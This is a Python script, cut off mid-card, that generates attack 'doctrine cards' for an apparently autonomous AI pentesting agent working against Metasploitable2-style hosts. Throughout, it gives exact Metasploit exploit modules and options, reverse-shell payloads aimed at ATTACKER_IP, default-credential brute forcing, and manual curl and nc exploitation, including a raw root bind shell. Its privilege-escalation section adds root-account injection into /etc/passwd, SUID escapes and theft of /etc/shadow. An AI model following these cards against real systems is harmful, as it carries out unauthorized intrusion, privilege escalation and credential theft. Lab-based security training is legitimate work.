# -*- coding: utf-8 -*-
"""
DB_03 - Gerador de DOUTRINA TATICA (cards-receita) para o RAG.

Cada card segue um formato denso e literal, feito para que ate modelos locais
pequenos consigam ACERTAR seguindo instrucoes (em vez de depender do proprio
conhecimento). O card de ataque traz:
  - TRIGGER        : quando aplicar (porta + banner)
  - STRATEGY       : enumeration | brute_force | exploit_cve  (o que o pipeline aceita)
  - MODULE         : modulo Metasploit exato
  - REQUIRED OPTIONS: chaves/valores LITERAIS para o JSON "options" do pipeline
  - WHY            : o porque (erros comuns / armadilhas)
  - ALT PORTS      : portas alternativas onde o mesmo servico aparece
  - IF MODULE MISSING: fallback em 3 camadas (search -> loadpath -> PoC manual)
  - AFTER SESSION  : primeiros passos de pos-exploracao

Alinhamento com o pipeline (src/pipe_v4.py):
  - O pipeline ja injeta RHOSTS e RPORT. "options" deve conter o RESTO.
  - Em brute_force NAO inclua USERNAME/PASSWORD: o script cuida da wordlist.
  - strategy deve ser exatamente: enumeration, brute_force ou exploit_cve.
"""
import os


def format_tactical_card(name, keywords, description, instructions):
    """Card de doutrina/estrategia para a IA (1 card = 1 chunk no RAG)."""
    return f"""
=== TACTICAL KNOWLEDGE CARD ===
NAME: manual/tactic/{name}
TYPE: strategy
KEYWORDS: {keywords}
DESCRIPTION: {description.strip()}
INSTRUCTIONS:
{instructions.strip()}
USAGE_NOTE: Apply this logic during the PLANNING phase to pick the module, the
EXACT options, and the right payload. Prefer following these steps literally.
===============================
"""


def attack_card(name, ports, banner_match, keywords, strategy, module,
                required_options, why, alt_ports="(none)", if_missing="",
                after_session="See card post_exploitation_basics.",
                extra_steps=""):
    """Atalho para gerar um card de ataque no formato padrao."""
    instr = f"""
TRIGGER: Port(s) {ports} OPEN and banner matches: {banner_match}
STRATEGY (use this exact value): {strategy}
PRIMARY MODULE: {module}

REQUIRED OPTIONS (copy these EXACT keys/values into the JSON "options";
RHOSTS and RPORT are injected automatically by the pipeline):
{required_options}
{extra_steps}
WHY / PITFALLS:
{why}

ALTERNATIVE PORTS: {alt_ports}

IF THE MODULE DOES NOT EXIST in this Metasploit install:
{if_missing if if_missing else _default_missing(module)}

AFTER YOU GET A SESSION:
{after_session}
""".strip()
    return format_tactical_card(name, keywords, description=banner_match,
                                instructions=instr)


def _default_missing(module):
    return f"""  1. SEARCH: run 'search {module.split('/')[-1]}' (or 'search <product> <version>')
     in msfconsole to find the real module name in THIS version. Names drift.
  2. NEAREST: if a close installed module exists, use it; else degrade to a
     version/enumeration scanner for the service and report findings.
  3. MANUAL: if no module exists at all, see card missing_module_manual_poc
     (searchsploit / curl / nmap NSE) to exploit it outside Metasploit."""


def main():
    print("[DB_03] === GERADOR DE DOUTRINA TATICA (MANUAL) ===")
    cards = []

    # =====================================================================
    # DOUTRINA GERAL (planejamento)
    # =====================================================================
    cards.append(format_tactical_card(
        name="os_fingerprinting_by_port",
        keywords="recon os detection windows linux unix port mapping fingerprint",
        description="Guess the Operating System from the set of open ports.",
        instructions="""
        PORT -> LIKELY OS:
          135, 139, 445, 3389, 5985 (WinRM) -> WINDOWS
          22 (SSH), 111 (RPC), 2049 (NFS), 3306/5432 (DB on Linux) -> LINUX/UNIX
          512/513/514 (r-services) -> LINUX/UNIX (classic)
        DECISION LOGIC:
          - Windows ports -> prefer exploit/windows/... modules.
          - Linux ports   -> prefer exploit/linux/... or exploit/unix/... modules.
          - exploit/multi/... works on several OS (check its options/targets).
        NEVER run a 'windows' exploit against a pure-Linux host (and vice-versa):
        it wastes attempts and can hang the module.
        """
    ))

    cards.append(format_tactical_card(
        name="general_module_selection_logic",
        keywords="how to choose module matching logic strategy decision",
        description="Rules for matching modules to targets and picking strategy.",
        instructions="""
        STRATEGY VALUES (return exactly one):
          - "enumeration": version/vuln scanners, NO credentials. Low risk.
          - "brute_force": login/auth scanners (module name has 'login'/'_login').
             Do NOT put USERNAME/PASSWORD in options; the pipeline feeds the wordlist.
          - "exploit_cve": strong product+version match to a known RCE/backdoor.
          - "manual": no module fits -> exploit by hand (see manual card).
        PRECEDENCE (very important - pick the FIRST that applies):
          1. STRONG product+version match to a known exploit, ESPECIALLY an
             UNAUTHENTICATED RCE/backdoor -> "exploit_cve" FIRST. A failed brute
             force ends that path, but an unauth exploit can win outright, so do
             NOT waste the attempt on brute force when a real exploit exists.
          2. Auth service (FTP/SSH/Telnet/SMB/DB/VNC) whose exploit NEEDS creds
             (e.g. mysql_udf, postgres_payload, mssql_exec) -> "brute_force" to
             GET the creds, THEN chain the exploit_cve on the next step. Try weak/
             blank/default creds (many DBs: root/blank, sa/blank, postgres/postgres).
          3. Auth service with NO public exploit -> "brute_force" alone.
          4. Uncertain -> "enumeration" (safe) and report.
        If your first choice fails, the pipeline will ask you again for THIS port:
        switch strategy (e.g. brute_force -> exploit_cve, or vice-versa) instead
        of giving up.
        PATH tells the OS: exploit/windows, exploit/linux, exploit/unix, exploit/multi.
        """
    ))

    cards.append(format_tactical_card(
        name="payload_selection_guide",
        keywords="payload reverse bind meterpreter cmd unix shell lhost lport target",
        description="How to choose PAYLOAD and whether to set LHOST/LPORT/TARGET.",
        instructions="""
        REVERSE vs BIND:
          - reverse_* : target connects BACK to you. REQUIRES "LHOST": <attacker>
            and "LPORT" (e.g. "4444"). Use when target can reach the attacker.
          - bind_*    : target OPENS a port; you connect in. OMIT LHOST/LPORT.
          - backdoor/interact payloads (cmd/unix/interact): connect to a shell the
            service itself opens. OMIT LHOST/LPORT.
        PAYLOAD BY TARGET OS:
          - Linux/Unix command exec -> "cmd/unix/reverse" or "cmd/unix/reverse_perl".
          - Windows x64             -> "windows/x64/meterpreter/reverse_tcp".
          - Windows x86             -> "windows/meterpreter/reverse_tcp".
        TARGET INDEX: some exploits have multiple TARGET entries. If unsure, start
        with the index the service card recommends; on failure, try the next index
        (the pipeline will re-ask you with the error). "Invalid payload for given
        target" ALWAYS means PAYLOAD and TARGET are mismatched: change one of them.
        """
    ))

    cards.append(format_tactical_card(
        name="lport_lhost_rules",
        keywords="lhost lport reverse connection attacker ip handler options",
        description="When to include LHOST/LPORT and common handler pitfalls.",
        instructions="""
        - Include "LHOST": "<ATTACKER_IP>" ONLY for reverse payloads.
        - "LPORT": pick an unused high port, e.g. "4444". Keep it consistent.
        - For exploits, usually "DisablePayloadHandler": "false" so MSF catches
          the shell automatically.
        - Bind/backdoor payloads: do NOT set LHOST/LPORT (no reverse connection).
        - If two exploits run back-to-back, reuse the same LPORT or the handler
          may still be bound; change LPORT if you see "address already in use".
        """
    ))

    # =====================================================================
    # FALLBACK: MODULO AUSENTE (A: search / B: loadpath / C: PoC manual)
    # =====================================================================
    cards.append(format_tactical_card(
        name="missing_module_search",
        keywords="module not found missing search cve rank unknown exploit nearest",
        description="TIER A: find the right module when 'use' fails (module missing).",
        instructions="""
        When the pipeline says a module does not exist, DO NOT guess blindly.
        TIER A - SEARCH inside Metasploit (names change between versions):
          - search cve:<YEAR>-<NUM>            (e.g. search cve:2007-2447)
          - search <product> <version>         (e.g. search vsftpd 2.3.4)
          - search type:exploit name:<keyword>
        Pick a result whose FULLNAME matches the service/OS. Return that exact
        FULLNAME as module_name.
        IF SEARCH RETURNS NOTHING RELEVANT:
          - Choose the NEAREST installed module for the same service (e.g. a
            generic version/login scanner) to keep progressing, OR
          - Escalate to TIER B (missing_module_loadpath) or TIER C
            (missing_module_manual_poc).
        """
    ))

    cards.append(format_tactical_card(
        name="missing_module_loadpath",
        keywords="loadpath reload_all external community module rb msf4 custom install",
        description="TIER B: load an external/community module that ships with the lab.",
        instructions="""
        Some CVEs only have a COMMUNITY module (a .rb file), not in the base install.
        The lab stages curated external modules in the repo at data/msf_modules/,
        MOUNTED into Metasploit at /root/.msf4/modules. Metasploit auto-loads
        ~/.msf4/modules at STARTUP, so those modules are usually already available:
        just 'search <keyword>' and 'use <full/path>'.
        If you dropped a new .rb at RUNTIME (same session, no restart), register it:
          1. loadpath /root/.msf4/modules   (adds the tree)
          2. reload_all                     (re-indexes)
          3. search <keyword>               (confirm it is listed)
          4. use <full/path/of/the/module>  (then set options as usual)
        If still nothing fits, go to TIER C (manual).
        """
    ))

    cards.append(format_tactical_card(
        name="missing_module_manual_poc",
        keywords="manual exploit searchsploit curl python nmap nse poc outside metasploit shell",
        description="TIER C: exploit WITHOUT a Metasploit module, via the shell.",
        instructions="""
        When no Metasploit module fits (common for very recent CVEs), exploit
        manually. Prefer a single, self-contained command.
        TOOLS (available on the attacker box):
          - searchsploit <product> <version>   -> find an Exploit-DB PoC path
          - searchsploit -m <id>               -> copy the PoC locally to run it
          - nmap --script vuln,<cve-script> -p <port> <TARGET>  -> NSE checks
          - curl / python3                     -> run an HTTP/raw PoC directly
        PATTERN for an HTTP CVE (adapt to the advisory):
          curl -s -X <METHOD> 'http://<TARGET>:<PORT>/<path>' \\
               -H '<vuln-header>: <payload>' --data '<body>'
        VERIFY: confirm code execution (id / whoami / a callback) before claiming
        success. If you open a reverse shell, start a listener first
        (e.g. 'nc -lvnp 4444' on <ATTACKER_IP>).
        REPORT exactly what you ran and the output, so it can be reproduced.
        """
    ))

    cards.append(format_tactical_card(
        name="encoder_failure_and_badchars",
        keywords="all encoders failed to encode badchars payload incompatible switch module php base64",
        description="What to do when Metasploit says 'All encoders failed to encode'.",
        instructions="""
        "All encoders failed to encode" means the MODULE's BadChars are incompatible
        with every available encoder for that payload. The payload itself is fine
        (it builds in msfvenom); the module rejects the encoded bytes. Retrying the
        SAME module with another payload usually fails the same way.
        WHAT TO DO (in order):
          1. Try a payload of a DIFFERENT TYPE the module accepts (see 'show
             payloads'): e.g. a "cmd/unix/*" or "generic/*" command payload instead
             of a staged php/meterpreter; command payloads often avoid the bad bytes.
          2. If it still fails, SWITCH MODULE (return "module_name"): pick another
             exploit for the SAME app whose payload type avoids the badchars -
             e.g. a file-UPLOAD module that writes a .php webshell instead of an
             eval-based one.
          3. If no module works, escalate to TIER C (missing_module_manual_poc):
             upload and execute a minimal webshell by hand.
        EXAMPLE: exploit/unix/webapp/tikiwiki_graph_formula_exec marks 'x' as a
        BadChar, so php/base64 (whose alphabet contains 'x') can NEVER encode a PHP
        payload for it -> do not keep retrying; switch to an upload-based module or
        a manual webshell.
        """
    ))

    cards.append(format_tactical_card(
        name="privilege_escalation_linux",
        keywords="privilege escalation privesc root suid sudo gtfobins kernel cron writable passwd uid 0 escalate low-priv shell",
        description="How to escalate from a low-priv shell (uid != 0) to root on Linux.",
        instructions="""
        GOAL: from a low-priv shell (uid != 0) reach uid=0(root). Work INSIDE the
        compromised shell with NON-INTERACTIVE one-liners (the shell has no tty).
        STEP 1 - ENUMERATE (read the output before deciding):
          id; uname -a; sudo -n -l 2>/dev/null; find / -perm -4000 -type f 2>/dev/null;
          ls -l /etc/passwd /etc/shadow; cat /etc/crontab 2>/dev/null; which gcc python perl
        STEP 2 - PICK A VECTOR (first that applies):
          A) sudo NOPASSWD: 'sudo -n -l' shows (ALL) or a binary -> GTFObins escape,
             e.g. 'sudo -n /bin/sh -c id', 'sudo -n find . -exec /bin/sh -c id \\;',
             'sudo -n awk "BEGIN{system(\\"id\\")}"'.
          B) SUID binary (owner root, -4000): abuse via GTFObins,
             e.g. 'find / -exec /bin/sh -p -c id \\;' , nmap/vim/less/cp/env tricks.
          C) World-writable /etc/passwd: append a root account with a known hash
             (openssl passwd -1 'pass') -> echo 'r:HASH:0:0::/root:/bin/bash' >> /etc/passwd
             then 'su r -c id'.
          D) Writable cron script run by root -> drop a command that gives root.
          E) Kernel exploit (old 2.6.x like Metasploitable2) compiled with gcc ONLY if
             gcc exists; try A-D first (faster, more reliable).
        CRITICAL (non-tty shell): NEVER launch an interactive tool BARE
        ('nmap --interactive', 'vim', 'less', 'ftp') -- it HANGS this shell and
        swallows your next commands. ALWAYS feed the escape in the SAME one-liner
        and finish with id. Ready-to-use SUID one-liners (pick what matches the
        SUID list / sudo -l output):
          SUID nmap (old 4.x): echo '!id' | /usr/bin/nmap --interactive   # runs id as root; use '!sh' for a root shell
          SUID find:           find /etc/hostname -exec /bin/sh -p -c id \\;
          SUID vim/rvim:       vim -E -c ':!id' -c ':q' 2>/dev/null
          SUID awk/nawk:       awk 'BEGIN{system("id")}'
          SUID python (-p):    python -c 'import os;os.setuid(0);os.system("id")'
          world-writable passwd: echo 'r::0:0::/root:/bin/sh' >> /etc/passwd && su r -c id
          sudo (old, no -n):   use 'sudo -l' (NOT 'sudo -n -l') to list; then
                               'sudo <bin> -c id' with a GTFObins escape.
        STEP 3 - CONFIRM: run 'id' and look for uid=0(root).
        """
    ))

    # =====================================================================
    # RECEITAS POR SERVICO (Metasploitable2 e alvos Linux/Unix classicos)
    # =====================================================================
    cards.append(format_tactical_card(
        name="attack_guide_mysql",
        keywords="mysql port 3306 mysql_login mysql_udf_payload root blank password host is blocked max_connect_errors target payload linux windows",
        description="MySQL (3306): credential test, UDF RCE, OS-aware TARGET/PAYLOAD, host-block pitfall.",
        instructions="""
        TRIGGER: Port 3306 OPEN, banner like "MySQL 5.x" (e.g. 5.0.51a).
        STEP 1 - CREDENTIALS: strategy brute_force with
        auxiliary/scanner/mysql/mysql_login. The root account may have a BLANK
        password; an empty password '' is VALID (not "missing"). The pipeline
        sends a blank value correctly.
        STEP 2 - RCE (once you have mysql creds): exploit/multi/mysql/mysql_udf_payload.
          REQUIRED OPTIONS (JSON "options"):
            "USERNAME": "root"
            "PASSWORD": "<the found password, or '' if blank>"
            "TARGET":   <index that MATCHES the recon "TARGET OS": pick the Linux
                         target when OS is Linux, the Windows target when Windows.
                         This module's default TARGET is Windows, so you MUST set
                         it to the Linux target on a Linux host.>
            "PAYLOAD":  <match the OS/TARGET: Linux -> "linux/x86/shell_reverse_tcp"
                         or "generic/shell_reverse_tcp"; do NOT use cmd/unix/reverse
                         (it is "not a compatible payload" for the Linux target).
                         Windows -> a "windows/..." payload.>
            "LHOST": "<attacker>", "LPORT": "4444"
        PITFALL - HOST BLOCKED: if MySQL replies "Host '...' is blocked because of
        many connection errors" (HostIsBlocked), the server tripped
        max_connect_errors from too many failed attempts. You do NOT control the
        target and cannot reset it from outside: STOP retrying MySQL in a loop and
        move to OTHER services/ports. (ONLY if you already hold a shell on the host
        via another service can you run 'mysqladmin flush-hosts' or SQL 'FLUSH
        HOSTS;' to clear it.)
        PITFALL - CONNECTION TIMEDOUT: typically the same connection-error pressure
        or a slow DB, NOT something a bigger timeout fixes; back off instead of
        hammering, and prefer another vector.
        """
    ))

    cards.append(attack_card(
        name="attack_guide_ftp_vsftpd234",
        ports="21", banner_match='FTP banner contains "vsftpd 2.3.4"',
        keywords="ftp port 21 vsftpd 2.3.4 backdoor smiley exploit",
        strategy="exploit_cve",
        module="exploit/unix/ftp/vsftpd_234_backdoor",
        required_options='    "TARGET": "1", "PAYLOAD": "cmd/unix/interact"',
        why="""  This module has two targets. TARGET 0 ("Linux/Unix Command") rejects
  cmd/unix/interact -> "Invalid payload for given target". TARGET 1
  ("Backdoor Command Shell") connects to the shell the server binds on port
  6200 and returns a session instantly. This is a BIND backdoor: do NOT set
  LHOST/LPORT.""",
        alt_ports="FTP may also run on 2121 (see ProFTPD card).",
        after_session="Run 'id'; you are usually root already. See post_exploitation_basics.",
    ))

    cards.append(attack_card(
        name="attack_guide_ftp_proftpd",
        ports="21, 2121", banner_match='FTP banner contains "ProFTPD"',
        keywords="ftp proftpd 2121 mod_copy 133c backdoor login brute",
        strategy="brute_force",
        module="auxiliary/scanner/ftp/ftp_login",
        required_options='    (none beyond RHOSTS/RPORT; the pipeline feeds the wordlist)',
        why="""  ProFTPD rarely has an unauthenticated backdoor like vsftpd. Start with
  anonymous/login. If banner is "ProFTPD 1.3.3c" try
  exploit/unix/ftp/proftpd_133c_backdoor (strategy exploit_cve,
  PAYLOAD cmd/unix/reverse, set LHOST/LPORT). If "mod_copy" is present try
  exploit/unix/ftp/proftpd_modcopy_exec.""",
        alt_ports="Metasploitable2 runs ProFTPD on 2121.",
    ))

    cards.append(attack_card(
        name="attack_guide_ssh_login",
        ports="22", banner_match='SSH banner "SSH-2.0-OpenSSH..."',
        keywords="ssh port 22 openssh login brute credentials weak password",
        strategy="brute_force",
        module="auxiliary/scanner/ssh/ssh_login",
        required_options='    (none beyond RHOSTS/RPORT; the pipeline feeds the wordlist)',
        why="""  SSH almost never has direct RCE. Go straight to credential testing with the
  lab wordlist. On Metasploitable2 the classic pair is msfadmin/msfadmin.
  Do NOT put USERNAME/PASSWORD in options; brute_force uses the wordlist file.""",
        after_session="A successful login yields a shell session; run 'sudo -l' and 'id'.",
    ))

    cards.append(attack_card(
        name="attack_guide_telnet_login",
        ports="23", banner_match='Telnet (port 23), cleartext login prompt',
        keywords="telnet port 23 login brute credentials cleartext msfadmin",
        strategy="brute_force",
        module="auxiliary/scanner/telnet/telnet_login",
        required_options='    (none beyond RHOSTS/RPORT; the pipeline feeds the wordlist)',
        why="""  Telnet sends credentials in cleartext. Brute force with the wordlist.
  Metasploitable2 accepts msfadmin/msfadmin.""",
    ))

    cards.append(attack_card(
        name="attack_guide_smtp_enum",
        ports="25", banner_match='SMTP banner "ESMTP"/"Postfix"/"Sendmail"/"Exim"',
        keywords="smtp port 25 postfix exim enumeration vrfy users",
        strategy="enumeration",
        module="auxiliary/scanner/smtp/smtp_enum",
        required_options='    (none beyond RHOSTS/RPORT)',
        why="""  SMTP is mostly useful for user enumeration (VRFY/EXPN). If banner is a
  vulnerable Exim, switch to exploit/linux/smtp/exim4_* (strategy exploit_cve).""",
    ))

    cards.append(attack_card(
        name="attack_guide_http_apache",
        ports="80, 8080", banner_match='HTTP "Apache"/"nginx"/"PHP"',
        keywords="http port 80 apache web enumeration dav webdav dir scanner",
        strategy="enumeration",
        module="auxiliary/scanner/http/http_version",
        required_options='    (none beyond RHOSTS/RPORT)',
        why="""  The WEB ENUMERATION section already ran for this port. ACT ON WHAT IT FOUND,
  do not re-enumerate blindly. If it discovered a specific app (phpMyAdmin,
  TikiWiki, TWiki, Drupal, WordPress, Jenkins, Struts), or WebDAV/PUT, or a
  header "X-Powered-By: PHP/5.x": DO NOT run http_version -> use that app's
  exploit card (strategy exploit_cve) and set TARGETURI to the discovered path.
  Pick http_version/dir_scanner ONLY if NOTHING exploitable was discovered.
  On Metasploitable2 /dav is WebDAV-writable (upload a webshell).""",
        alt_ports="Tomcat on 8180; alternative HTTP on 8080/8000.",
    ))

    cards.append(attack_card(
        name="attack_guide_tomcat_manager",
        ports="8180, 8080", banner_match='HTTP "Apache-Coyote"/"Tomcat"',
        keywords="tomcat port 8180 coyote manager login deploy war upload",
        strategy="brute_force",
        module="auxiliary/scanner/http/tomcat_mgr_login",
        required_options='    (none beyond RHOSTS/RPORT; the pipeline feeds the wordlist)',
        why="""  First brute the Manager app (classic creds tomcat/tomcat). Once you have
  creds, chain to exploit/multi/http/tomcat_mgr_upload (strategy exploit_cve)
  with "HttpUsername"/"HttpPassword" and a java/meterpreter payload to deploy
  a WAR and get a session.""",
        alt_ports="Tomcat often on 8080, 8180, 8443.",
    ))

    cards.append(attack_card(
        name="attack_guide_samba_usermap",
        ports="139, 445", banner_match='SMB "Samba 3.0.x" / Unix host',
        keywords="samba smb port 139 445 usermap script cve-2007-2447 linux",
        strategy="exploit_cve",
        module="exploit/multi/samba/usermap_script",
        required_options='    "PAYLOAD": "cmd/unix/reverse", "LHOST": "<ATTACKER_IP>", "LPORT": "4444"',
        why="""  CVE-2007-2447 (username map script command injection). Works on Samba
  3.0.20-3.0.25. This is a REVERSE shell: set LHOST/LPORT. Returns a root
  shell. Use RPORT 139; 445 also works.""",
        alt_ports="Try 445 if 139 is filtered.",
        if_missing="""  1. search cve:2007-2447  (or 'search usermap')
  2. For Samba 3.5.0-4.6.4 instead try exploit/linux/samba/is_known_pipename.
  3. Else degrade to auxiliary/scanner/smb/smb_version + smb_enumshares.""",
    ))

    cards.append(attack_card(
        name="attack_guide_java_rmi",
        ports="1099", banner_match='Java RMI registry on 1099',
        keywords="java rmi port 1099 rmiregistry server codebase exploit",
        strategy="exploit_cve",
        module="exploit/multi/misc/java_rmi_server",
        required_options='    "PAYLOAD": "java/meterpreter/reverse_tcp", "LHOST": "<ATTACKER_IP>", "LPORT": "4444"',
        why="""  Default RMI config allows loading a remote class (unauthenticated RCE).
  Reverse payload: set LHOST/LPORT. If java/meterpreter fails, try
  java/shell/reverse_tcp.""",
    ))

    cards.append(attack_card(
        name="attack_guide_distcc",
        ports="3632", banner_match='distccd on 3632',
        keywords="distcc port 3632 distributed compiler cve-2004-2687 exec",
        strategy="exploit_cve",
        module="exploit/unix/misc/distcc_exec",
        required_options='    "PAYLOAD": "cmd/unix/reverse", "LHOST": "<ATTACKER_IP>", "LPORT": "4444"',
        why="""  CVE-2004-2687: distccd runs attacker commands unauthenticated. Reverse
  shell (set LHOST/LPORT). Lands as the 'daemon' user; then privesc.""",
        after_session="You are user 'daemon'. Try udev/overlayfs local privesc; see post card.",
    ))

    cards.append(attack_card(
        name="attack_guide_unrealircd",
        ports="6667, 6697", banner_match='IRC "UnrealIRCd" (esp. 3.2.8.1)',
        keywords="irc port 6667 unrealircd 3.2.8.1 backdoor cve-2010-2075",
        strategy="exploit_cve",
        module="exploit/unix/irc/unreal_ircd_3281_backdoor",
        required_options='    "PAYLOAD": "cmd/unix/reverse", "LHOST": "<ATTACKER_IP>", "LPORT": "4444"',
        why="""  CVE-2010-2075: the 3.2.8.1 tarball shipped a backdoor. Reverse shell
  (set LHOST/LPORT). If it stalls, try cmd/unix/reverse_perl.""",
        alt_ports="IRC also on 6697 (TLS) and 6660-6669.",
    ))

    cards.append(attack_card(
        name="attack_guide_postgresql",
        ports="5432", banner_match='PostgreSQL on 5432',
        keywords="postgresql port 5432 postgres login brute payload udf",
        strategy="brute_force",
        module="auxiliary/scanner/postgres/postgres_login",
        required_options='    (none beyond RHOSTS/RPORT; the pipeline feeds the wordlist)',
        why="""  Default Metasploitable2 creds: postgres/postgres. After valid creds, chain
  exploit/linux/postgres/postgres_payload (strategy exploit_cve) with
  "USERNAME"/"PASSWORD" and a linux reverse payload to get a session.""",
    ))

    cards.append(attack_card(
        name="attack_guide_mysql",
        ports="3306", banner_match='MySQL/MariaDB on 3306',
        keywords="mysql port 3306 mariadb login brute udf payload root blank",
        strategy="brute_force",
        module="auxiliary/scanner/mysql/mysql_login",
        required_options='    (none beyond RHOSTS/RPORT; the pipeline feeds the wordlist)',
        why="""  Metasploitable2 MySQL often has root with a BLANK password. After creds,
  chain exploit/multi/mysql/mysql_udf_payload (strategy exploit_cve) for RCE.""",
    ))

    cards.append(attack_card(
        name="attack_guide_vnc",
        ports="5900, 5901", banner_match='VNC "RFB" on 5900',
        keywords="vnc port 5900 rfb no-auth login password weak",
        strategy="brute_force",
        module="auxiliary/scanner/vnc/vnc_login",
        required_options='    (none beyond RHOSTS/RPORT; the pipeline feeds the wordlist)',
        why="""  First test no-auth with auxiliary/scanner/vnc/vnc_none_auth (strategy
  enumeration). Metasploitable2 VNC password is 'password'. VNC gives GUI
  control, not a direct shell.""",
        alt_ports="VNC displays map to 5900+N (5901, 5902, ...).",
    ))

    cards.append(attack_card(
        name="attack_guide_rservices",
        ports="512, 513, 514", banner_match='r-services (rexec/rlogin/rsh)',
        keywords="rservices port 512 513 514 rexec rlogin rsh trust login",
        strategy="brute_force",
        module="auxiliary/scanner/rservices/rsh_login",
        required_options='    (none beyond RHOSTS/RPORT; the pipeline feeds the wordlist)',
        why="""  Legacy trust-based login. On Metasploitable2 'rsh -l root <ip>' often works
  due to a permissive .rhosts. If the module is missing, see
  missing_module_manual_poc and run the rsh/rlogin client from the shell.""",
    ))

    cards.append(attack_card(
        name="attack_guide_ingreslock_bindshell",
        ports="1524", banner_match='open 1524 "ingreslock" / raw root shell',
        keywords="ingreslock port 1524 bindshell backdoor root netcat manual",
        strategy="exploit_cve",
        module="(no standard MSF module - this is a raw bind shell)",
        required_options='    (not applicable)',
        why="""  Metasploitable2 leaves a ROOT bind shell on 1524. There is no exploit
  module: you just CONNECT. This needs the MANUAL path.""",
        if_missing="""  Use TIER C (missing_module_manual_poc): from the attacker shell run
    nc <TARGET> 1524
  and you land directly as root. Then run 'id' to confirm.""",
        after_session="You are root immediately. Collect /etc/shadow, see post card.",
    ))

    cards.append(attack_card(
        name="attack_guide_snmp",
        ports="161 (UDP)", banner_match='SNMP service on 161/udp',
        keywords="snmp port 161 udp community public private enumeration leak",
        strategy="enumeration",
        module="auxiliary/scanner/snmp/snmp_enum",
        required_options='    (none beyond RHOSTS/RPORT; default community is "public")',
        why="""  SNMP with a known community string (often "public") leaks users, processes,
  interfaces, routes, installed software and sometimes credentials. If "public"
  fails, brute communities with auxiliary/scanner/snmp/snmp_login
  (strategy brute_force). SNMP is UDP.""",
    ))

    cards.append(attack_card(
        name="attack_guide_ldap",
        ports="389, 636", banner_match='LDAP service on 389 (636 LDAPS)',
        keywords="ldap port 389 directory anonymous bind enumeration query login",
        strategy="enumeration",
        module="auxiliary/gather/ldap_query",
        required_options='    (set the base DN if known; try an anonymous bind first)',
        why="""  Many LDAP servers allow ANONYMOUS bind -> dump the directory (users, groups,
  sometimes password hashes/descriptions). If bind requires creds, brute with
  auxiliary/scanner/ldap/ldap_login (strategy brute_force).""",
        alt_ports="636 = LDAPS (set SSL true); 3268/3269 = Global Catalog.",
    ))

    cards.append(attack_card(
        name="attack_guide_nfs",
        ports="2049, 111", banner_match='nfs / rpcbind / mountd',
        keywords="nfs port 2049 111 rpcbind mountd exports showmount mount shares",
        strategy="enumeration",
        module="auxiliary/scanner/nfs/nfsmount",
        required_options='    (none beyond RHOSTS/RPORT)',
        why="""  Lists exported shares and who may mount them. A world-readable/writable export
  is a foothold: read /etc, or drop an SSH key / cron. If the share is writable
  this is TIER C (manual): mount it and plant a key/payload.""",
        if_missing="""  TIER C (missing_module_manual_poc): 'showmount -e <TARGET>' then
  'mount -t nfs <TARGET>:/<export> /mnt' and read/write files.""",
    ))

    cards.append(attack_card(
        name="attack_guide_dns",
        ports="53", banner_match='DNS service on 53 (tcp/udp)',
        keywords="dns port 53 zone transfer axfr enumeration subdomains",
        strategy="enumeration",
        module="auxiliary/gather/enum_dns",
        required_options='    (set DOMAIN if known; enable zone transfer / AXFR)',
        why="""  A misconfigured server allows a zone transfer (AXFR) that dumps every DNS
  record -> internal hostnames and IPs (map for lateral movement). DNS itself is
  rarely a direct shell; it is reconnaissance.""",
    ))

    cards.append(attack_card(
        name="attack_guide_mssql",
        ports="1433", banner_match='Microsoft SQL Server on 1433',
        keywords="mssql port 1433 sql server login brute xp_cmdshell sa payload",
        strategy="brute_force",
        module="auxiliary/scanner/mssql/mssql_login",
        required_options='    (none beyond RHOSTS/RPORT; the pipeline feeds the wordlist)',
        why="""  Classic weak creds: sa with blank/weak password. AFTER valid creds, get RCE
  with auxiliary/admin/mssql/mssql_exec (enables xp_cmdshell, runs a command;
  set USERNAME/PASSWORD/CMD) or exploit/windows/mssql/mssql_payload
  (strategy exploit_cve, windows payload + LHOST/LPORT).""",
    ))

    cards.append(attack_card(
        name="attack_guide_redis",
        ports="6379", banner_match='Redis service on 6379',
        keywords="redis port 6379 unauth replication rce config login nosql",
        strategy="exploit_cve",
        module="exploit/linux/redis/redis_replication_cmd_exec",
        required_options='    "PAYLOAD": "linux/x64/meterpreter/reverse_tcp", "LHOST": "<ATTACKER_IP>", "LPORT": "4444"',
        why="""  Redis is frequently UNAUTHENTICATED -> RCE via the replication/module-load
  trick. First confirm access with auxiliary/scanner/redis/redis_server
  (strategy enumeration). If it needs a password, brute with
  auxiliary/scanner/redis/redis_login. Alt module: exploit/linux/redis/redis_unauth_exec.""",
    ))

    cards.append(attack_card(
        name="attack_guide_mongodb",
        ports="27017", banner_match='MongoDB on 27017',
        keywords="mongodb port 27017 nosql no-auth login dump database",
        strategy="brute_force",
        module="auxiliary/scanner/mongodb/mongodb_login",
        required_options='    (none beyond RHOSTS/RPORT; the pipeline feeds the wordlist)',
        why="""  MongoDB is very often deployed with NO authentication -> connect and dump all
  databases (credentials, tokens). mongodb_login confirms access/creds. Loot is
  data, not a shell; use found creds elsewhere.""",
    ))

    cards.append(attack_card(
        name="attack_guide_smtp_exim",
        ports="25, 587", banner_match='SMTP banner shows a vulnerable "Exim"',
        keywords="smtp port 25 exim string format cve-2010-4344 rce mail",
        strategy="exploit_cve",
        module="exploit/unix/smtp/exim4_string_format",
        required_options='    "PAYLOAD": "cmd/unix/reverse", "LHOST": "<ATTACKER_IP>", "LPORT": "4444"',
        why="""  Vulnerable Exim 4.x (CVE-2010-4344) -> remote root. Only for Exim; a generic
  Postfix/Sendmail banner is NOT this - there, stick to smtp_enum. Alt for
  Dovecot-backed Exim: exploit/linux/smtp/exim4_dovecot_exec.""",
    ))

    cards.append(attack_card(
        name="attack_guide_jboss",
        ports="8080, 80, 8443", banner_match='http-enum/title shows "JBoss"/jmx-console',
        keywords="jboss port 8080 jmx-console deployer war java rce targeturi",
        strategy="exploit_cve",
        module="exploit/multi/http/jboss_maindeployer",
        required_options='    "TARGETURI": "/", "PAYLOAD": "java/meterpreter/reverse_tcp", "LHOST": "<ATTACKER_IP>", "LPORT": "4444"',
        why="""  First scan with auxiliary/scanner/http/jboss_vulnscan (strategy enumeration).
  An exposed JMX/web-console lets you deploy a WAR -> RCE. Alt module:
  exploit/multi/http/jboss_invoke_deploy. Set TARGETURI to the JBoss base path.""",
    ))

    cards.append(attack_card(
        name="attack_guide_wordpress",
        ports="80, 443", banner_match='http-enum found "/wp-login.php" or "/wp-content/"',
        keywords="wordpress wp-login wp-content plugin theme xmlrpc enum rce cms",
        strategy="enumeration",
        module="auxiliary/scanner/http/wordpress_scanner",
